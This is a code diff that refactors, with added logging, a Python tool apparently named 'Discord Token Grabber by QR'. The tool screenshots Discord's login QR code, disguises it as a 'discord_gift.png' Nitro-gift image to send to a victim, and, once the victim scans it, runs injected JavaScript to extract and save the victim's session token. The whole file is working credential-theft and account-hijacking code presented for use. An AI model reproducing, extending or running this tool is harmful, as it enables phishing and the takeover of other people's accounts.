@@ -6,36 +6,40 @@ __license__ = "MIT"
 __repository__ = "https://github.com/hirusha-adi/Discord-Token-Grabber-by-QR"
 
 
-from selenium import webdriver
-from PIL import Image
-import time
 import os
-from dtg import utitlites
+import time
+
+from loguru import logger
+from PIL import Image
+from selenium import webdriver
 from selenium.webdriver.common.by import By
 
+from dtg import utitlites
 
 
+@logger.catch
 def logo_qr():
+    logger.debug("Pasting the overlay image onto the QR code.")
     im1 = Image.open(os.path.join('image', 'qr_code.png'), 'r')
     im2 = Image.open(os.path.join('image', 'overlay.png'), 'r')
     im2_w, im2_h = im2.size
     im1.paste(im2, (60, 55))
     im1.save(os.path.join('image', 'final_qr.png'), quality=95)
+    logger.debug("Overlay image pasted successfully.")
 
 
+@logger.catch
 def paste_template():
+    logger.debug("Pasting the QR code onto the template.")
     im1 = Image.open(os.path.join('image', 'template.png'), 'r')
     im2 = Image.open(os.path.join('image', 'final_qr.png'), 'r')
     im1.paste(im2, (120, 409))
     im1.save('discord_gift.png', quality=95)
+    logger.debug("File saved to discord_gift.png")
 
 
-def main():
-    utitlites.show_logo()
-    options = webdriver.ChromeOptions()
-    options.add_experimental_option('excludeSwitches', ['enable-logging'])
-    options.add_experimental_option('detach', True)
-
+@logger.catch
+def get_executable_path():
     executable_path = ""
     if os.name == 'nt':
         current_dir_file = os.path.join(os.getcwd(), "chromedriver.exe")
@@ -58,19 +62,38 @@ def main():
             executable_path = bin_file
         else:
             executable_path = None
+    return executable_path
+
+
+@logger.catch
+def main():
+    utitlites.show_logo()
+    options = webdriver.ChromeOptions()
+    options.add_experimental_option('excludeSwitches', ['enable-logging'])
+    options.add_experimental_option('detach', True)
+    logger.debug("Loaded the options for Chrome webdriver.")
+
+    executable_path = get_executable_path()
+    logger.debug(f"Found chromedriver executable_path: {executable_path}")
 
     if executable_path is None:
         driver = webdriver.Chrome(options=options)
+        logger.debug("Initialising Chrome webdriver without passing in the executable_path")
     else:
         driver = webdriver.Chrome(
             options=options,
             executable_path=executable_path
         )
+        logger.debug("Initialising Chrome webdriver by passing in the executable_path")
+
+    logger.debug("Chrome webdriver is ready.")
 
     driver.get('https://discord.com/login')
     time.sleep(utitlites.Config.DISCORD_WAIT_TIME)
-    print('- Page loaded.')
+    logger.success("Loaded discord login page.")
 
+
+    # ------------------
 
     # old (with BeautifulSoup4)
     # ---------
@@ -85,20 +108,23 @@ def main():
     image_element = driver.find_element(by=By.XPATH, value=f"//div[@class='qrCodeOverlay_ae8574']") # of type `selenium.webdriver.remote.webelement.WebElement`
     original_qr_code_image = image_element.screenshot_as_png # of type `bytes`
 
+    # ------------------
+
     file = os.path.join(os.getcwd(), 'image', 'qr_code.png')
     with open(file, "wb") as handler:
         handler.write(original_qr_code_image)
+        logger.debug(f"Saved original QR code to: {file}")
 
     discord_login = driver.current_url
     logo_qr()
     paste_template()
 
-    print('+ QR Code has been generated > ./discord_gift.png')
-    print('+ Send the QR Code to user and scan. Waiting...')
+    logger.success('QR Code has been generated > ./discord_gift.png')
+    logger.success('Send the QR Code to user and scan. Waiting...')
 
     while True:
         if discord_login != driver.current_url:
-            print('! Grabbing token..')
+            logger.success("Grabbing token...")
             token = driver.execute_script(r'''
 var req = webpackJsonp.push([
     [], {
@@ -116,13 +142,12 @@ for (let e in req.c)
     }
 return token;   
                 ''')
-            print('-'*8)
-            print('+ Token grabbed:', token)
-            print('-'*8)
+            logger.success(f'Token grabbed: {token}')
             utitlites.save_results_to_file(str(token))
+            logger.debug("Saved results to file")
             break
 
-    print('+ Task complete')
+    logger.success('Task complete')
 
 
 if __name__ == '__main__':
